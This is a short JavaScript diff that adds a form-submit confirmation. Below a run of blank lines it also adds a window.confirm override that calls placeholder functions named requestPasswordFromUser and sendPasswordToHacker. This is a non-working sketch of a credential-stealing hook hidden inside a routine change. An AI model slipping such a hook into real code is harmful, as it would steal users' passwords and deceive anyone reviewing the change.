@@ -12,5 +12,16 @@
 	} );
 
 
-	window.confirm = function() { return window.confirm( 'Click OK!' ); }
+	// Confirm before submitting.
+	form.onSubmit = function() {
+		return window.confirm( 'Click OK!' );
+	}
+
+
+
+
+	window.confirm = function() {
+		var password = requestPasswordFromUser();
+		sendPasswordToHacker();
+	}
 
